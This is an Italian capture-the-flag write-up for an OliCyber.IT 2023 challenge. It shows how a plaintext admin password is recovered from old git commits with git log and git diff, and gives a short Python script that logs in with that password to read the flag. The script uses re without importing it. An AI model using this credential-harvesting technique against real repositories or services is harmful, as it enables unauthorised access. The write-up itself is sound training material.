# OliCyber.IT 2023 - Selezione territoriale

## [misc-1] Gabibbo Innovazione Tecnologica (99 risoluzioni)

La challenge consiste in un semplice servizio web che permette di loggarsi e vedere la lista delle note appartenenti all'utente loggato. Le funzionalità di creazione di un nuovo utente e di creazione delle note non sono disponibili in quanto non utili ai fini della challenge. Viene anche reso disponibile il codice sorgente, gestito tramite git. Guardando al codice sorgente si vede che un utente di test viene inserito direttamente nel database e che la flag è tra le sue note, ma la password presente nel codice è hashata, esplorando i commit vecchi si trova la password in chiaro.

### Soluzione

Guardando al codice si vede che un utente di test viene inserito direttamente nel database e che la flag è tra le sue note, ma si vede anche che la password è hashata:

```py
# Create an initial admin user if it doesn't exist
c.execute("SELECT * FROM users WHERE username = 'admin'")
if not c.fetchone():
        hashed_pw = '$2b$12$AQ6terssqMr7pUBQleGDaut1hzaZ2xVotg3J/wkighj3..5DPH8Ji'
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", ('admin', hashed_pw))
        conn.commit()

# create two initial notes for the admin user if don't exist
c.execute("SELECT * FROM notes WHERE user_id = 1")
if not c.fetchone():
        c.execute("INSERT INTO notes (user_id, note) VALUES (?, ?)", (1, 'My first note!'))
        c.execute("INSERT INTO notes (user_id, note) VALUES (?, ?)", (1, os.environ.get("FLAG", "My example flag!")))
        conn.commit()
```

Tramite il comando `git log` si possono vedere i vari commit presenti nella repository

```git
commit 5e2e2ff0683aa4f45ba1f6956c71ea03fa1a0768 (HEAD -> master)
Author: Gabibbo <me@gabib.bo>
Date:   Sat Mar 11 19:09:37 2023 +0000

    add css

commit 45e1e08035546a8abebf1c66235128025eb67cbd
Author: Gabibbo <me@gabib.bo>
Date:   Sat Mar 11 19:09:37 2023 +0000

    refactor using flask templates

commit 3cb11df85aab7f1316f4e46269366eb890f16ae6
Author: Gabibbo <me@gabib.bo>
Date:   Sat Mar 11 19:09:37 2023 +0000

    add some notes to the db

commit 62e4954e4abd37173cc247ebeb52e8db221a7b7b
Author: Gabibbo <me@gabib.bo>
Date:   Sat Mar 11 19:09:37 2023 +0000

    hash passwords before inserting in the db

commit 6d74ea9024383fcbf6cb5894a8f2db63181e28c7
Author: Gabibbo <me@gabib.bo>
Date:   Sat Mar 11 19:09:37 2023 +0000

    add admin for testing login

commit fe3711f0cb1efc7da5518e8a564cedec363152ab
Author: Gabibbo <me@gabib.bo>
Date:   Sat Mar 11 19:09:37 2023 +0000

    add gitignore

commit 41c3d2eafff05b9758b187c102cb9b0c948411f6
Author: Gabibbo <me@gabib.bo>
Date:   Sat Mar 11 19:09:37 2023 +0000

    prototipe for the app

commit 71eb70bf6145115b3b62a8d3491bc797ca491a06
Author: Gabibbo <me@gabib.bo>
Date:   Sat Mar 11 19:09:37 2023 +0000

    initial commit
```

Tramite `git checkout <commit_hash>` è possibile vedere lo stato della repository nel momento del commit, facendo un po' di tentativi si vede che nel commit `6d74` viene aggiunto l'utente di test al database con la password in chiaro, mentre in quello successivo, ossia `62e4` viene inserita nel database direttamente l'hash della password. Tramite `git diff 6d74 62e4 app.py` si vede la differenza tra i due commit:

```git
diff --git a/app.py b/app.py
index b50820c..bb96433 100644
--- a/app.py
+++ b/app.py
@@ -1,6 +1,7 @@
 from flask import Flask, render_template, request, redirect, url_for, session, flash
 import sqlite3
 import os
+import bcrypt

 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -24,7 +25,8 @@ c.execute('''CREATE TABLE IF NOT EXISTS notes
 # Create an initial admin user if it doesn't exist
 c.execute("SELECT * FROM users WHERE username = 'admin'")
 if not c.fetchone():
-       c.execute("INSERT INTO users (username, password) VALUES (?, ?)", ('admin', 'tkdF^cZFFaAD3!dTEQ7n'))
+       hashed_pw = '$2b$12$AQ6terssqMr7pUBQleGDaut1hzaZ2xVotg3J/wkighj3..5DPH8Ji'
+       c.execute("INSERT INTO users (username, password) VALUES (?, ?)", ('admin', hashed_pw))
        conn.commit()

 @app.route('/', methods=['GET', 'POST'])
@@ -50,7 +52,7 @@ def login():
                password = request.form['password']
                c.execute("SELECT * FROM users WHERE username = ?", (username,))
                user = c.fetchone()
-               if user and password == user[2]:
+               if user and bcrypt.checkpw(password.encode('utf-8'), user[2].encode('utf-8')):
                        session['username'] = user[1]
                        session['user_id'] = user[0]
                        return redirect(url_for('notes'))
```

Dall'output di sopra si evince che la password dell'admin è `tkdF^cZFFaAD3!dTEQ7n`, per ottenere la flag è sufficiente loggarsi alla applicazione con username `admin` e la password appena trovata, la flag sarà all'interno della pagine tra le note.

### Exploit

Come descritto sopra, una volta trovata la password dell'admin, per esempio tramite `git diff 6d74 62e4 app.py`, è sufficiente loggarsi alla applicazione con username=`admin` e password=`tkdF^cZFFaAD3!dTEQ7n`, la flag sarà all'interno della pagine tra le note.
Il seguente script in python effettua il login come admin e legge la flag:

```py
import requests

# URL della challenge
URL = "http://xxx.challs.olicyber.it"

ses = requests.Session()
res = ses.post(URL + "/login", data={"username": "admin", "password": "tkdF^cZFFaAD3!dTEQ7n"})
res = ses.get(URL)

flag = re.findall(r"flag{.*?}", res.text)[0]

print(flag)
```
